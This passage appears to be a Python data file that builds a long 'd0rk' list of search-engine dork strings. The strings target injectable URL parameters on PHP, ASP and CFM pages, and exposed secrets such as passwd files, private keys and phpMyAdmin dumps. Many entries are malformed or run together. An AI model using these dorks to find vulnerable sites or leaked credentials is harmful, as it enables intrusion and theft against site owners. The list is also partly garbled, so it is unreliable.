         'more.php?submore.php?sub', 'moredetail.asp?XEID', 'moredetail.asp?id', 'moredetail.php?XEID',
         'moredetail.php?id', 'mp.php?id', 'mpacms/dc/article.php?id', 'mpprt.php?item', 'msadcs.dll', 'msg',
         'mtdbpass.cgifiles', 'mview.asp?psdb', 'mview.php?psdb', 'mwchat/libs/startlobby.php?CONFIG[MWCHATLibs]',
         'myPHPCalendar/admin.php?caldir', 'myResourcesnoBanner.php?categoryID', 'myaccount.asp?catid',
         'myaccount.cfm?catid', 'myaccount.php?catid', 'myevent.php?myeventpath', 'mylink.php?id', 'mysql.class',
         'mysqldumpfiletypesql', 'mysqlerrorwithquery', 'mysqlhistoryfiles', 'mystuff.xmlTrilliandatafiles',
         'naboard/memo.asp?bd', 'naboard/memo.php?bd', 'names.nsf', 'names.nsf?opendatabase', 'nasar/news.php?id',
         'natterchathome.aspsitenatterchat.co.uk',
         'natterchathome.aspsitenatterchat.co.ukXOOPSCustomInstallationhtpasswdfiletypehtpasswdyapbozdetay.aspViewWebcamUserAccessingallcontrol/multiview',
         'nav.php?gnav.php?g', 'nav.php?gonav.php?go', 'nav.php?lkphp?lk', 'nav.php?lnphp?ln', 'nav.php?locnav.php',
         'nav.php?locnav.php?loc', 'nav.php?locphp?loc', 'nav.php?navnav.php?nav', 'nav.php?pagenav.php?page',
         'nav.php?paginanav.php?pagina', 'nav.php?pagnav.php?pag', 'nav.php?pgnav.php?pg', 'nav.php?pnav.php?p',
         'netscape.hst', 'netscape.ini', 'networkadministrationnic', 'netwtcp.shtml', 'new',
         'new/showproduct.php?prodid', 'news.asp?id', 'news.asp?t', 'news.asp?type', 'news.cfm?id', 'news.cgi',
         'news.cgi?a114&t', 'news.cgi?alatest&t', 'news.cgi?t', 'news.php?CONFIG[scriptpath]', 'news.php?articleID',
         'news.php?category', 'news.php?catid', 'news.php?display', 'news.php?id', 'news.php?item', 'news.php?t',
         'news.php?type', 'news/article.php?id', 'news/articleRead.php?id', 'news/detail.asp?id', 'news/detail.php?id',
         'news/details.php?id', 'news/index.php?ID', 'news/latestnews.asp?catid', 'news/latestnews.php?catid',
         'news/news.asp?id', 'news/news.php?id', 'news/news/titleshow.asp?id', 'news/news/titleshow.php?id',
         'news/newsdetail.php?id', 'news/newsitem.asp?newsID', 'news/newsitem.php?id', 'news/newsitem.php?newsID',
         'news/newsletter.php?id', 'news/pressannouncements/pressrelease.php?pressid', 'news/show.php?id',
         'news/shownews.php?article', 'news/shownewsarticle.asp?articleid', 'news/shownewsarticle.php?articleid',
         'news/temp.asp?id', 'news/temp.php?id', 'news/v.php?id', 'news/viewarticle.php?id', 'newsDetail.php?id',
         'newsDetails.php?ID', 'newsandnotices.asp?newsid', 'newsandnotices.php?newsid', 'newscat.php?id',
         'newscontent.asp?CategoryID', 'newscontent.php?CategoryID', 'newsdesk.cgi?alatest&t', 'newsdesk.cgi?t',
         'newsdetail.asp?id', 'newsdetail.php?file', 'newsdisplay.php?getid', 'newsfull.php?id',
         'newshop/category.php?c', 'newsid', 'newsite/events.php?id', 'newsite/pdfshow.asp?id',
         'newsite/pdfshow.php?id', 'newsitem.asp?id', 'newsitem.asp?newsid', 'newsitem.php?id', 'newsitem.php?newsID',
         'newsitem.php?num', 'newsletter/admin/', 'newsletter/admin/newsletteradmin', 'newsletter/newsletter.php?id',
         'newsletter/newsletter.php?letter']
d0rk += ['newsmore.php?id', 'newsone.php?id', 'newsstory.php?id', 'newstickerinfo.php?idn', 'newsupdate.cgi?alatest&t',
         'newsview.php?id', 'newvisitor.inc.php?lvcincludedir', 'nightlife/martini.php?cid', 'njm/cntpdf.php?t',
         'nl/default.asp?id', 'nota.php?OpenPage', 'nota.php?abre', 'nota.php?adresa', 'nota.php?b', 'nota.php?basedir',
         'nota.php?basepath', 'nota.php?category', 'nota.php?channel', 'nota.php?chapter', 'nota.php?cmd',
         'nota.php?content', 'nota.php?corpo', 'nota.php?destino', 'nota.php?disp', 'nota.php?doshow', 'nota.php?eval',
         'nota.php?filepath', 'nota.php?get', 'nota.php?goFile', 'nota.php?h', 'nota.php?header', 'nota.php?home',
         'nota.php?in', 'nota.php?inc', 'nota.php?include', 'nota.php?ir', 'nota.php?itemnav', 'nota.php?ki',
         'nota.php?lang', 'nota.php?left', 'nota.php?link', 'nota.php?m', 'nota.php?mid', 'nota.php?mod',
         'nota.php?modo', 'nota.php?module', 'nota.php?n', 'nota.php?nivel', 'nota.php?oldal', 'nota.php?opcion',
         'nota.php?option', 'nota.php?pag', 'nota.php?pagina', 'nota.php?panel', 'nota.php?pg', 'nota.php?play',
         'nota.php?pollname', 'nota.php?pr', 'nota.php?pre', 'nota.php?qry', 'nota.php?rub', 'nota.php?sec',
         'nota.php?secc', 'nota.php?seccion', 'nota.php?second', 'nota.php?seite', 'nota.php?sekce',
         'nota.php?showpage', 'nota.php?subject', 'nota.php?t', 'nota.php?tipo', 'nota.php?url', 'nota.php?v',
         'notfordistributionconfidential', 'notforpublicrelease.edu.gov.mil', 'notice/notice.php?id',
         'noticias.php?arq', 'notify/notifyform.asp?topicid', 'notify/notifyform.php?topicid', 'nowviewing.php?id',
         'nphtestcgi', 'nreplyboard.asp?typeboard', 'nreplyboard.php?typeboard', 'nuell/itemshow.php?itemID',
         'nukefiletypesql', 'num', 'nurl/admin/login.asp', 'nurladd.asp?bookid', 'nurlstatus.html|apache.html',
         'nyheder.htm?show', 'oMailadminAdministrationLoginomnis.ch', 'obio/detail.asp?id', 'obio/detail.php?id',
         'obj/print.php?objId', 'ocp103/index.php?reqpathocPortal', 'ocwloginusername', 'odbc.iniextinicvs',
         'offer.php?idf', 'offerinfo.php?id', 'oftentypedasargumentstrings', 'oglinet.php?oglid',
         'ogloszenia/rss.asp?cat', 'ogloszenia/rss.php?cat', 'oldreports.php?file', 'onlinesales/product.asp?productid',
         'onlinesales/product.php?productid', 'onlineshop/productView.php?rangeId', 'openfile',
         'opengroupware.orgresistanceisobsoleteReportBugsUsername',
         'opengroupware.orgresistanceisobsoleteReportBugsUsernamepassword', 'openxchangelogin.pl', 'opinion.php?option',
         'opinions.php?id', 'opportunities/bursary.php?id', 'opportunities/event.php?id', 'oppureprovate\http//bobbob',
         'oracle/ifaqmaker.php?id', 'orasso.wwssoappadmin.lslogin', 'order', 'order.asp?BookID', 'order.asp?id',
         'order.asp?itemID', 'order.asp?lotid', 'order.cfm?BookID', 'order.cfm?id', 'order.cfm?itemID',
         'order.php?BookID', 'order.php?id', 'order.php?itemID', 'order.php?langorder.php?lang',
         'order.php?listorder.php?list', 'order.php?lnorder.php?ln', 'order.php?lorder.php?l',
         'order.php?pageorder.php?page', 'order.php?pagorder.php?pag', 'order.php?pgorder.php?pg',
         'order.php?porder.php?p', 'order.php?wporder.php?wp', 'order.php?wpphp?wp', 'order/cart/index.php?maincatid',
         'ordernow.php?prodid',
         'osCommerceadminintextredistributableundertheGNUintextOnlineCatalogdemositeoscommerce.com',
         'ospfd.confintextpasswordsampletesttutorialdownload', 'otherinformation', 'ourblog.asp?categoryid',
         'ourblog.php?categoryid', 'ovcgi/jovw', 'ovtv.asp?item', 'ovtv.php?item', 'p.php?pp.php?p', 'p.php?pphp?p',
         'packageinfo.php?id', 'packagesdisplay.asp?ref', 'packagesdisplay.php?ref', 'padrao.php?',
         'padrao.php?OpenPage', 'padrao.php?[]', 'padrao.php?a', 'padrao.php?abre', 'padrao.php?addr',
         'padrao.php?basedir', 'padrao.php?basepath', 'padrao.php?body', 'padrao.php?c', 'padrao.php?choix',
         'padrao.php?cont', 'padrao.php?corpo', 'padrao.php?d', 'padrao.php?destino', 'padrao.php?eval',
         'padrao.php?filepath', 'padrao.php?h', 'padrao.php?header', 'padrao.php?incl', 'padrao.php?index',
         'padrao.php?ir', 'padrao.php?link', 'padrao.php?loc', 'padrao.php?menu', 'padrao.php?menue', 'padrao.php?mid',
         'padrao.php?middle', 'padrao.php?n', 'padrao.php?name', 'padrao.php?nivel', 'padrao.php?oldal',
         'padrao.php?op', 'padrao.php?open', 'padrao.php?pag', 'padrao.php?page', 'padrao.php?path', 'padrao.php?pname',
         'padrao.php?pre', 'padrao.php?qry', 'padrao.php?read', 'padrao.php?redirect', 'padrao.php?root',
         'padrao.php?rub', 'padrao.php?secao', 'padrao.php?secc', 'padrao.php?seccion', 'padrao.php?section',
         'padrao.php?seite', 'padrao.php?sekce', 'padrao.php?sivu', 'padrao.php?str', 'padrao.php?strona',
         'padrao.php?subject', 'padrao.php?texto', 'padrao.php?tipo', 'padrao.php?type', 'padrao.php?u',
         'padrao.php?url', 'padrao.php?var', 'padrao.php?xlink', 'page', 'page.asp?PartID', 'page.asp?areaid',
         'page.asp?id', 'page.asp?modul', 'page.asp?module', 'page.asp?pId', 'page.cfm', 'page.cfm?PartID',
         'page.php5?idpage.php5?id', 'page.php5?idphp5?id', 'page.php?', 'page.php?OpenPage', 'page.php?PartID',
         'page.php?[]', 'page.php?abre', 'page.php?action', 'page.php?addr', 'page.php?adresa', 'page.php?areaid',
         'page.php?arqphp?arq', 'page.php?basedir', 'page.php?chapter', 'page.php?choix']
d0rk += ['page.php?cmd', 'page.php?cont', 'page.php?doc', 'page.php?e', 'page.php?ev', 'page.php?eval', 'page.php?file',
         'page.php?g', 'page.php?go', 'page.php?goto', 'page.php?id', 'page.php?inc', 'page.php?incl', 'page.php?ir',
         'page.php?left', 'page.php?link', 'page.php?lnphp?ln', 'page.php?load', 'page.php?loader', 'page.php?mid',
         'page.php?middle', 'page.php?mod', 'page.php?modo', 'page.php?modul', 'page.php?module', 'page.php?numero',
         'page.php?oldal', 'page.php?option', 'page.php?p', 'page.php?pId', 'page.php?pa', 'page.php?panel',
         'page.php?phpbbrootpath', 'page.php?pname', 'page.php?ppage.php?p', 'page.php?pphp?p', 'page.php?pref',
         'page.php?q', 'page.php?qry', 'page.php?read', 'page.php?recipe', 'page.php?redirect', 'page.php?secao',
         'page.php?section', 'page.php?seite', 'page.php?showpage', 'page.php?sivu', 'page.php?spage.php?s',
         'page.php?sphp', 'page.php?sphp?s', 'page.php?strona', 'page.php?subject', 'page.php?tipo', 'page.php?url',
         'page.php?where', 'page.php?z', 'page/de/produkte/produkte.asp?prodID', 'page/de/produkte/produkte.php?prodID',
         'page/venue.asp?id', 'page/venue.php?id', 'page2.php?id', 'pageType1.php?id', 'pageType2.php?id',
         'pageprod.php?idcat', 'pages', 'pages.asp?ID', 'pages.php?id', 'pages.php?page',
         'pages/events/specificevent.php?id', 'pages/index.php?pID', 'pages/print.asp?id', 'pages/print.php?id',
         'pages/product.php?productid', 'pages/video.asp?id', 'pages/video.php?id', 'pagina', 'pagina.php?OpenPage',
         'pagina.php?basedir', 'pagina.php?basepath', 'pagina.php?category', 'pagina.php?channel', 'pagina.php?chapter',
         'pagina.php?choix', 'pagina.php?cmd', 'pagina.php?dir', 'pagina.php?ev', 'pagina.php?filepath', 'pagina.php?g',
         'pagina.php?go', 'pagina.php?goto', 'pagina.php?header', 'pagina.php?home', 'pagina.php?id', 'pagina.php?in',
         'pagina.php?incl', 'pagina.php?include', 'pagina.php?index', 'pagina.php?ir', 'pagina.php?k',
         'pagina.php?lang', 'pagina.php?left', 'pagina.php?link', 'pagina.php?load', 'pagina.php?loader',
         'pagina.php?loc', 'pagina.php?mid', 'pagina.php?middlePart', 'pagina.php?modo', 'pagina.php?my',
         'pagina.php?n', 'pagina.php?nivel', 'pagina.php?numero', 'pagina.php?oldal', 'pagina.php?pagina',
         'pagina.php?panel', 'pagina.php?path', 'pagina.php?pr', 'pagina.php?pre', 'pagina.php?q', 'pagina.php?read',
         'pagina.php?recipe', 'pagina.php?ref', 'pagina.php?sec', 'pagina.php?secao', 'pagina.php?seccion',
         'pagina.php?section', 'pagina.php?sekce', 'pagina.php?start', 'pagina.php?str', 'pagina.php?thispage',
         'pagina.php?tipo', 'pagina.php?to', 'pagina.php?type', 'pagina.php?u', 'pagina.php?v', 'pagina.php?z',
         'painting.php?id', 'panditonline/productlist.php?id', 'papsecretscvs',
         'parentdirectory/appz/xxxhtmlhtmphpshtmlopendivxmd5md5sums',
         'parentdirectoryDVDRipxxxhtmlhtmphpshtmlopendivxmd5md5sums',
         'parentdirectoryGamezxxxhtmlhtmphpshtmlopendivxmd5md5sums',
         'parentdirectoryMP3xxxhtmlhtmphpshtmlopendivxmd5md5sums',
         'parentdirectoryNameofSingeroralbumxxxhtmlhtmphpshtmlopendivx',
         'parentdirectoryNameofSingeroralbumxxxhtmlhtmphpshtmlopendivxmd5md5sums',
         'parentdirectoryXvidxxxhtmlhtmphpshtmlopendivxmd5md5sums', 'parentdirectoryproftpdpasswd',
         'participant.php?id', 'pass.dat', 'passlist', 'passlist.txt', 'passlist.txtabetterway', 'passwd', 'passwd.txt',
         'passwd/etcreliable', 'passwdfiletypetxt', 'password', 'pastevent.asp?id', 'pastevent.php?id', 'path',
         'path.php?', 'path.php?[]', 'path.php?action', 'path.php?addr', 'path.php?adresa', 'path.php?body',
         'path.php?category', 'path.php?channel', 'path.php?chapter', 'path.php?cmd', 'path.php?destino',
         'path.php?disp', 'path.php?doshow', 'path.php?ev', 'path.php?eval', 'path.php?filepath', 'path.php?goto',
         'path.php?header', 'path.php?home', 'path.php?id', 'path.php?in', 'path.php?incl', 'path.php?ir',
         'path.php?left', 'path.php?link', 'path.php?load', 'path.php?loader', 'path.php?menue', 'path.php?mid',
         'path.php?middle', 'path.php?middlePart', 'path.php?my', 'path.php?nivel', 'path.php?numero',
         'path.php?opcion', 'path.php?option', 'path.php?p', 'path.php?pageweb', 'path.php?panel', 'path.php?path',
         'path.php?play', 'path.php?pname', 'path.php?pre', 'path.php?pref', 'path.php?qry', 'path.php?recipe',
         'path.php?sec', 'path.php?secao', 'path.php?sivu', 'path.php?sp', 'path.php?start', 'path.php?strona',
         'path.php?subject', 'path.php?thispage', 'path.php?tipo', 'path.php?type', 'path.php?var', 'path.php?where',
         'path.php?xlink', 'path.php?y', 'path/index.php?functioncustom&custompath',
         'pathofcpcommerce/functions.php?prefix', 'pathtocalendar', 'payment.asp?CartID', 'payment.cfm?CartID',
         'payment.php?CartID', 'pbserver.dll', 'pcANYWHEREEXPRESSJavaClient', 'pdetail.asp?itemid',
         'pdetail.cfm?itemid', 'pdetail.php?itemid', 'pdfpost.asp?ID', 'pdfpost.php?ID', 'people.lst',
         'perform.inifiletypeini', 'performfiletypeini', 'perl', 'perl.exe', 'perl/printenv', 'perlshop.cgi',
         'person.php?id', 'pharmaxim/category.asp?cid', 'pharmaxim/category.php?cid', 'phf',
         'phoneaddressemailcurriculumvitae', 'phorum/read.php?3716721quote', 'photog.php?id', 'photogallery.asp?id',
         'photogallery.php?id', 'photoview.php?id', 'php', 'php.cgi', 'php.inifiletypeini']
d0rk += ['php/event.php?id', 'php/fid27BF3BCB1A648805B511298CE6D643E72B4D59AD.aspx?s',
         'php/fid8E1BED06B1301BAE3ED64383D5F619E3B1997A70.aspx?s',
         'php/fid985C124FBD9EF3A29BA8F40521F12D097B0E2016.aspx?s',
         'php/fidEAD6DDC6CC9D1ADDFD7876B7715A3342E18A865C.aspx?s', 'php/index.php?id', 'php121login.php',
         'phpMyAdminMySQLDumpINSERTINTOthe', 'phpMyAdminMySQLDumpfiletypetxt',
         'phpMyAdminWelcometophpMyAdminrunningonasroot', 'phpMyAdmindumps', 'phpMyAdminrunningonmain.php',
         'phpOpenTrackerStatistics', 'phpPgAdminLoginLanguage', 'phpSysInfo/createdbyphpsysinfo', 'phpWebMail',
         'phpaddressbookThisistheaddressbookforwarning', 'phphlstatsintextHalflifestatisticsfilelistsusernameand',
         'phpicalendaradministrationsitesourceforge.net', 'phpinfo', 'phpinfoPHPVersion',
         'phpinfomysql.defaultpasswordZends?ri?tingLanguageEngine', 'phpnews.login', 'phpshop/index.php?basedir',
         'phpwcms/include/incext/spaw/dialogs/table.php?spawroot',
         'phpwcms/include/incext/spaw/dialogs/table.php?spawrootindex.php?id',
         'phpwcms/include/incext/spaw/dialogs/table.php?spawrootphpwcms/index.php?id', 'phpx?PageID',
         'picgallery/category.asp?cid', 'picgallery/category.php?cid', 'pipe.php?HCLpath',
         'pivot/modules/moduledb.php?pivotpath', 'player.php?id', 'playold.php?id', 'pleaselogin',
         'pleaseloginyourpasswordis', 'plesklogin.php3', 'plik', 'pls/admin/gateway.htm',
         'pls/admin/gateway.htmrpSys.htmlsearch.phpvbulletinservlet/webacc', 'plusmail', 'pm/lib.inc.php?pmpath',
         'podcast/item.asp?pid', 'podcast/item.php?pid', 'poem.php?id', 'poemlist.asp?bookID', 'poemlist.php?bookID',
         'policy.php?id', 'ponuky/itemshow.asp?ID', 'ponuky/itemshow.php?ID', 'pop.php?id', 'port.php?content',
         'portafolio/portafolio.asp?id', 'portafolio/portafolio.php?id', 'portfolio.html?categoryid',
         'portscan.phpfromPort|PortRange', 'post.php?id', 'postfixadminpostfixadminextphp', 'postquery',
         'poweredbyEQdkp', 'poweredbydoodlecart', 'poweredbyopenbsdpoweredbyapache', 'poweredbyphpCOIN1.2.3',
         'powered|performedbyBeyondSecuritysAutomatedScanningkazaaexample',
         'powered|performedbyBeyondSecurity?sAutomatedScanningkazaaexample', 'powersearch.asp?CartId',
         'powersearch.cfm?CartId', 'powersearch.php?CartId', 'powerup.cgi?alatest&t', 'ppads/external.php?type',
         'preferences.ini[emule]', 'preorder.php?bookID', 'press.php?', 'press.php?OpenPage', 'press.php?[]',
         'press.php?abre', 'press.php?addr', 'press.php?basedir', 'press.php?category', 'press.php?channel',
         'press.php?destino', 'press.php?dir', 'press.php?ev', 'press.php?get', 'press.php?goFile', 'press.php?home',
         'press.php?i', 'press.php?id', 'press.php?inc', 'press.php?incl', 'press.php?include', 'press.php?ir',
         'press.php?itemnav', 'press.php?lang', 'press.php?link', 'press.php?loader', 'press.php?menu', 'press.php?mid',
         'press.php?middle', 'press.php?modo', 'press.php?module', 'press.php?my', 'press.php?nivel',
         'press.php?opcion', 'press.php?option', 'press.php?pa', 'press.php?page', 'press.php?pageweb',
         'press.php?pagina', 'press.php?panel', 'press.php?param', 'press.php?path', 'press.php?pg', 'press.php?pname',
         'press.php?pr', 'press.php?pref', 'press.php?redirect', 'press.php?root', 'press.php?rub', 'press.php?second',
         'press.php?seite', 'press.php?strona', 'press.php?subject', 'press.php?t', 'press.php?thispage',
         'press.php?to', 'press.php?type', 'press.php?where', 'press.php?xlink', 'press/press.php?id', 'press2.php?ID',
         'presscutting.php?id', 'presse.php?dophp?do', 'presse.php?dopresse.php?do', 'pressrelease.asp?id',
         'pressrelease.php?id', 'pressrelease/releasedetail.php?id', 'pressreleases.php?id',
         'pressreleases/pressreleases.php?id', 'pressroom/viewnews.php?id', 'preview.php?id', 'preview.php?pid',
         'prevresults.asp?prodID', 'prevresults.php?prodID', 'price.asp', 'price.cfm', 'price.php',
         'principal.php?abre', 'principal.php?addr', 'principal.php?b', 'principal.php?basepath', 'principal.php?choix',
         'principal.php?cont', 'principal.php?conteudo', 'principal.php?corpo', 'principal.php?d',
         'principal.php?destino', 'principal.php?disp', 'principal.php?ev', 'principal.php?eval', 'principal.php?f',
         'principal.php?filepath', 'principal.php?goto', 'principal.php?header', 'principal.php?home',
         'principal.php?id', 'principal.php?in', 'principal.php?inc', 'principal.php?index', 'principal.php?ir',
         'principal.php?ki', 'principal.php?l', 'principal.php?left', 'principal.php?link', 'principal.php?load',
         'principal.php?loader', 'principal.php?loc', 'principal.php?menue', 'principal.php?middle',
         'principal.php?middlePart', 'principal.php?module', 'principal.php?my', 'principal.php?n',
         'principal.php?nivel', 'principal.php?oldal', 'principal.php?opcion', 'principal.php?p', 'principal.php?pag',
         'principal.php?pagina', 'principal.php?param', 'principal.php?phpbbrootpath', 'principal.php?pollname',
         'principal.php?pr', 'principal.php?pre', 'principal.php?pref', 'principal.php?q', 'principal.php?read',
         'principal.php?recipe', 'principal.php?ref', 'principal.php?rub', 'principal.php?s', 'principal.php?secc',
         'principal.php?seccion', 'principal.php?seite', 'principal.php?strona', 'principal.php?subject',
         'principal.php?tipo', 'principal.php?to', 'principal.php?type']
d0rk += ['principal.php?url', 'principal.php?viewpage', 'principal.php?w', 'principal.php?z', 'print.asp?id',
         'print.asp?sid', 'print.cgi', 'print.php?OpenPage', 'print.php?addr', 'print.php?basedir',
         'print.php?basepath', 'print.php?category', 'print.php?chapter', 'print.php?choix', 'print.php?cont',
         'print.php?dir', 'print.php?disp', 'print.php?doshow', 'print.php?g', 'print.php?goFile', 'print.php?goto',
         'print.php?header', 'print.php?id', 'print.php?in', 'print.php?inc', 'print.php?itemnav', 'print.php?ki',
         'print.php?l', 'print.php?left', 'print.php?link', 'print.php?loc', 'print.php?menu', 'print.php?menue',
         'print.php?middle', 'print.php?middlePart', 'print.php?module', 'print.php?my', 'print.php?name',
         'print.php?numero', 'print.php?opcion', 'print.php?open', 'print.php?option', 'print.php?pag',
         'print.php?page', 'print.php?pagerphp?pager', 'print.php?pagerprint.php?pager', 'print.php?param',
         'print.php?path', 'print.php?play', 'print.php?pname', 'print.php?pollname', 'print.php?pre', 'print.php?r',
         'print.php?read', 'print.php?root', 'print.php?rub', 'print.php?s', 'print.php?sekce', 'print.php?sid',
         'print.php?sivu', 'print.php?sp', 'print.php?str', 'print.php?strona', 'print.php?tablephp?table',
         'print.php?thispage', 'print.php?tipo', 'print.php?type', 'print.php?u', 'print.php?where',
         'printarticle.php?id', 'printcards.asp?ID', 'printcards.php?ID', 'printer/main.htmlintextsettings',
         'printstory.asp?id', 'printstory.php?id', 'privacy.asp?cartID', 'privacy.cfm?cartID', 'privacy.php?cartID',
         'privatekeyfiles.csr', 'privatekeyfiles.key', 'prod.asp?cat', 'prod.php?cat', 'prod.php?prodphp?prod',
         'prodView.asp?idProduct', 'prodView.cfm?idProduct', 'prodView.php?idProduct', 'prodbycat.asp?intCatalogID',
         'prodbycat.cfm?intCatalogID', 'prodbycat.php?intCatalogID', 'proddetail.php?id', 'proddetail.php?prod',
         'proddetail.php?prodphp?prod', 'proddetails.php?id', 'proddetails.php?productsid',
         'proddetailsprint.php?prodid', 'prodetails.asp?prodid', 'prodetails.cfm?prodid', 'prodetails.php?prodid',
         'prodindiv.php?groupid', 'prodinfo.php?id', 'prodlist.asp?catid', 'prodlist.cfm?catid', 'prodlist.php?catid',
         'prodotti.asp?idcat', 'prodotti.php?idcat', 'prodrev.php?cat', 'prodshow.asp?id', 'prodshow.asp?prodid',
         'producedbygetstats', 'product.asp?', 'product.asp?ItemID', 'product.asp?ProductID', 'product.asp?bid',
         'product.asp?bookID', 'product.asp?cat', 'product.asp?id', 'product.asp?idh', 'product.asp?intProdID',
         'product.asp?intProductID', 'product.asp?pid', 'product.asp?prd', 'product.asp?prodid', 'product.asp?product',
         'product.asp?shopprodid', 'product.asp?sku', 'product.cfm?bookID', 'product.cfm?intProdID', 'product.php?',
         'product.php?ItemID', 'product.php?ProductID', 'product.php?bid', 'product.php?bookID', 'product.php?brand',
         'product.php?c', 'product.php?cat', 'product.php?catid', 'product.php?fdProductId', 'product.php?id',
         'product.php?idh', 'product.php?inid', 'product.php?intProdID', 'product.php?intProductID', 'product.php?lang',
         'product.php?par', 'product.php?pcid', 'product.php?pid', 'product.php?pl', 'product.php?prd',
         'product.php?prodid', 'product.php?prodnum', 'product.php?product', 'product.php?productno',
         'product.php?productsid', 'product.php?proid', 'product.php?rangeid', 'product.php?shopprodid',
         'product.php?sku', 'product.search.php?proid', 'product/detail.asp?id', 'product/detail.php?id',
         'product/list.asp?pid', 'product/list.php?pid', 'product/product.asp?cate', 'product/product.asp?productno',
         'product/product.php?cate', 'product/product.php?productno', 'product2.php?id', 'product3.php?id',
         'productDetail.php?prodId', 'productDetails.asp?idProduct', 'productDetails.cfm?idProduct',
         'productDetails.php?id', 'productDetails.php?idProduct', 'productDisplay.asp', 'productDisplay.cfm',
         'productDisplay.php', 'productList.asp?cat', 'productList.php?cat', 'productcustomed.php?pid',
         'productdetail.asp?productid', 'productdetail.cfm?id', 'productdetail.php?id', 'productdetail.php?productid',
         'productdetails.asp?id', 'productdetails.asp?prodid', 'productdetails.asp?productid',
         'productdetails.php?prodID', 'productdetails.php?productid', 'productguide/companydetail.php?id',
         'productinfo.asp?id', 'productinfo.asp?item', 'productinfo.asp?itemid', 'productinfo.asp?productsid',
         'productinfo.cfm?item', 'productinfo.cfm?itemid', 'productinfo.php?cat', 'productinfo.php?id',
         'productinfo.php?item', 'productinfo.php?itemid', 'productinfo.php?productsid', 'productitem.php?id',
         'productlist.asp?ViewTypeCategory&CategoryID', 'productlist.asp?categoryid', 'productlist.asp?cid',
         'productlist.asp?fid', 'productlist.asp?grpid', 'productlist.asp?id', 'productlist.asp?tid',
         'productlist.cfm?ViewTypeCategory&CategoryID', 'productlist.php?ViewTypeCategory&CategoryID',
         'productlist.php?categoryid', 'productlist.php?cid', 'productlist.php?fid', 'productlist.php?grpid',
         'productlist.php?id', 'productlist.php?tid', 'productpage.asp', 'productpage.cfm', 'productpage.php',
         'productpage.php?ID', 'productrange.asp?rangeID', 'productrange.php?rangeID', 'productrangesview.asp?ID',
         'productrangesview.php?ID', 'productreviews.php?featureid']
d0rk += ['products.asp?DepartmentID', 'products.asp?ID', 'products.asp?act', 'products.asp?cat',
         'products.asp?categoryID', 'products.asp?catid', 'products.asp?groupid', 'products.asp?keyword',
         'products.asp?openparent', 'products.asp?p', 'products.asp?rub', 'products.asp?type', 'products.cfm?ID',
         'products.cfm?keyword', 'products.html?file', 'products.php?DepartmentID', 'products.php?ID',
         'products.php?act', 'products.php?areaid', 'products.php?cat', 'products.php?categoryID', 'products.php?catid',
         'products.php?cid', 'products.php?groupid', 'products.php?keyword', 'products.php?mainID',
         'products.php?openparent', 'products.php?p', 'products.php?page', 'products.php?parent',
         'products.php?prodphp?prod', 'products.php?req', 'products.php?rub', 'products.php?session',
         'products.php?sku', 'products.php?sub', 'products.php?subgroupid', 'products.php?type', 'products/?catID',
         'products/Blitzball.htm?id', 'products/card.asp?prodID', 'products/card.php?prodID',
         'products/category.php?id', 'products/displayproduct.php?productid', 'products/index.asp?rangeid',
         'products/index.php?cat', 'products/index.php?rangeid', 'products/itemshow.php?itemId',
         'products/model.php?id', 'products/parts/detail.asp?id', 'products/parts/detail.php?id',
         'products/product.asp?ID', 'products/product.asp?pid', 'products/product.php?article',
         'products/product.php?id', 'products/product.php?pid', 'products/productdetails.php?prodID',
         'products/productlist.asp?id', 'products/productlist.php?id', 'products/products.asp?p',
         'products/products.php?cat', 'products/products.php?p', 'products/testimony.php?id',
         'products/treedirectory.asp?id', 'productsByCategory.asp?intCatalogID', 'productsByCategory.cfm?intCatalogID',
         'productsByCategory.php?intCatalogID', 'productscategory.asp?CategoryID', 'productscategory.cfm?CategoryID',
         'productscategory.php?CategoryID', 'productsconnectionsdetail.php?catid', 'productsdetail.asp?CategoryID',
         'productsdetail.cfm?CategoryID', 'productsdetail.php?CategoryID', 'productsdetail.php?id',
         'productsdisplaydetails.asp?prodid', 'productsdisplaydetails.php?prodid', 'productsview.asp?proid',
         'productsview.php?proid', 'productview.php?id', 'produit.php?id', 'produit.php?prodphp?prod',
         'produkt.php?prodphp?prod', 'profile.asp?id', 'profile.php?id', 'profile.php?objID', 'profile/detail.php?id',
         'profile/newsdetail.php?id', 'profileprint.asp?id', 'profileprint.php?id', 'profiles.',
         'profiles/profile.asp?profileid', 'profiles/profile.php?profileid', 'profilesfiletypemdb',
         'profileview.php?id', 'program/details.php?ID', 'projDetail.php?id', 'projdetails.asp?id',
         'projdetails.php?id', 'projectdisplay.php?pid', 'projects/detail.php?id', 'projects/event.asp?id',
         'projects/event.php?id', 'projects/project.php?id', 'projects/pview.php?id', 'projects/view.php?id',
         'promo.asp?id', 'promo.cfm?id', 'promo.php?id', 'promotion.asp?catid', 'promotion.cfm?catid',
         'promotion.php?catid', 'promotion.php?id', 'properties.asp?idcat', 'properties.php?idcat', 'property.asp?id',
         'property.php?id', 'proxy|wpadextpac|extdatfindproxyforurl', 'psyBNCconfigfiles',
         'psychology/people/detail.asp?id', 'psychology/people/detail.php?id', 'pub/pds/pdsview.asp?start',
         'pub/pds/pdsview.php?start', 'public', 'publication/ontargetdetails.php?oid', 'publications.asp?Id',
         'publications.php?id', 'publications/?id', 'publications/bookreviews/fullreview.asp?id',
         'publications/bookreviews/fullreview.php?id', 'publications/publication.asp?id',
         'publications/publication.php?id', 'publications/view.asp?id', 'publications/view.php?id',
         'publicindividualsponsorship.php?ID', 'publisher', 'pubsdetails.php?id', 'pubsmore2.php?id',
         'purelydiamond/products/category.asp?cat', 'purelydiamond/products/category.php?cat', 'putty.reg',
         'pview.asp?Item', 'pview.cfm?Item', 'pview.php?Item', 'pwd.dat', 'pwd.db', 'pylones/item.php?item', 'qrystr',
         'queries/lostquotes/?id', 'query', 'questions.asp?questionid', 'questions.php?questionid',
         'rapidshareintextlogin', 'rating.asp?id', 'rating.php?id', 'rating/stat.asp?id', 'rating/stat.php?id',
         'ray.php?id', 'rca/store/item.php?item', 'rdbqdssite.edusite.milsite.gov', 'read.php?id', 'read.php?in',
         'readnews.php?id', 'reagir.php?num', 'recipe/category.asp?cid', 'recipe/category.php?cid',
         'recordprofile.php?id', 'recruitdetails.php?id', 'redaktion/whiteteeth/detail.asp?nr',
         'redaktion/whiteteeth/detail.php?nr', 'redirect.cgi', 'referral/detail.asp?siteid',
         'referral/detail.php?siteid', 'register.cgi', 'release.php?id', 'releases.php?id',
         'releasesheadlinesdetails.asp?id', 'releasesheadlinesdetails.php?id', 'remixer.php?id',
         'remoteassessmentOpenAanvalConsole', 'rentals.php?id', 'reply.asp?id', 'reply.php?id',
